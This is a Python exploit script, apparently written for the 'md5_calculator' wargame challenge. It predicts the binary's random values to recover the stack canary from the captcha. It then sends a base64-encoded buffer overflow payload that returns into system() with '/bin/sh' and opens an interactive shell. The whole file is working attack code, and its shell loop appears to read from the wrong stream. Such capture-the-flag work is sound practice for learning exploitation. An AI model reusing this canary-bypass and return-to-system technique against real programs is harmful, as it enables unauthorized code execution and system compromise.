import os, subprocess, sys
import base64, struct
import fcntl

# start process and fill in captcha
p = subprocess.Popen(["/home/raw/Documents/pwnable/rookis/md5_calculator/hash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

# Get random integers seeded at same time
x = subprocess.Popen(["/home/raw/Documents/pwnable/rookis/md5_calculator/c_random"], stdout=subprocess.PIPE)
output = x.communicate()[0].split("\n")

for i in range(0,8):
	exec('rand_int_' + str(i) + ' = int(output[' + str(i) + '])')
	print "random integer " + str(i) + " = " + str(output[i])


data = ""
while "captcha" not in data:
	data = p.stdout.readline()
	#print data

captcha_value = int(data[data.find(":")+1:])
p.stdin.write(str(captcha_value)+"\r\n")

# Determine canary

# captcha is calculated by:
# captcha_value = (rand_int_1 + rand_int_5) + (rand_int_2 - rand_int_3) + (rand_int_7 + canary_value) + (rand_int_4 - rand_int_6)

canary_value = captcha_value - (rand_int_1 + rand_int_5) - (rand_int_2 - rand_int_3) - (rand_int_4 - rand_int_6) - rand_int_7 

# cast to 32-bit with overflow
#canary_value = 0x42424242
canary_value= canary_value & 0xffffffff

print "canary = " + str(canary_value)

# Create payload
eip_offset = 524 
canary_offset = eip_offset-12
buffer_address = 0x804b0e0 + 716
system_address = 0x08049187

# fill array
payload = "A"*(canary_offset)
payload += struct.pack("I",canary_value)
payload += "A"*(eip_offset - canary_offset)
payload += struct.pack("I",system_address)
payload += struct.pack("I",buffer_address)

# encode payload in base64
payload = base64.b64encode(payload)

# append system argument
payload += "/bin/sh\x00" 
payload += "\r\n"


#p.stdout.flush()

data = ""
while "BASE64" not in data:
	data = p.stdout.readline()
	print data

 
# send payload
p.stdin.write(payload)

data = ""
while "MD5" not in data:
	data = p.stdout.readline()
	print data

#p.stdin.flush()
#p.stdout.flush()

fd = p.stdout.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

while(True):
	try:
		while(True):
			data = p.stdin.read()
			sys.stdout.write(data)
	except:
		p.stdin.write(raw_input() +"\r\n")
		#p.stdin.write("ls\r\n")

